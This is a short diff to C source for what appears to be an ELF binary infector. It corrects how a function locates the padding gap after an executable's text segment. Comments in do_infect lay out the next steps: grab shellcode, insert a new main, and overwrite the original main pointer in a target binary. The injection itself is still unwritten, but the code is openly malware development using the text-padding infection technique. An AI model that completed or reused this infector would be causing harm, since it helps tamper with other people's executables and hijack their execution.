@@ -228,11 +228,12 @@ int find_gap(uint8_t* elf_base, empty_area_t* area) {
 		psz = *((uint64_t*)(cursor + ELF_PHEAD_FILESZ)); 
 		pvaddr = *((uint64_t*)(cursor + ELF_PHEAD_VADDR));
 		
-		printf("Type %x, flags %x, off %018lx, sz %018lx\n", ptype, pflags, poff, psz);
+		printf("Type %x, flags %x, off %016lx, vaddr %016lx sz %016lx\n", ptype, pflags, poff, pvaddr, psz);
 
 		if ((pflags & ELF_EXEC_FLAGS) && ptype == ELF_PT_LOAD) {
 			// found our text segment
 			text_end = poff + psz;
+			area->vaddr = pvaddr + psz;
 			break;
 		}
 	}
@@ -264,7 +265,6 @@ int find_gap(uint8_t* elf_base, empty_area_t* area) {
 
 	area->fileoffset = text_end;
 	area->size = pad_len;
-	area->vaddr = pvaddr;
 
 	return 0;
 }
@@ -299,7 +299,8 @@ int do_infect(char* target_path, char* lib_path, char* exported_func) {
 	}
 	printf("foff = %lx, vaddr = %lx, len = %lx\n", pad_area.fileoffset, pad_area.vaddr, pad_area.size);
 
-	// TODO
+	// grab the shellcode
+
 	// put in our new main
 
 	// overwrite original main pointer
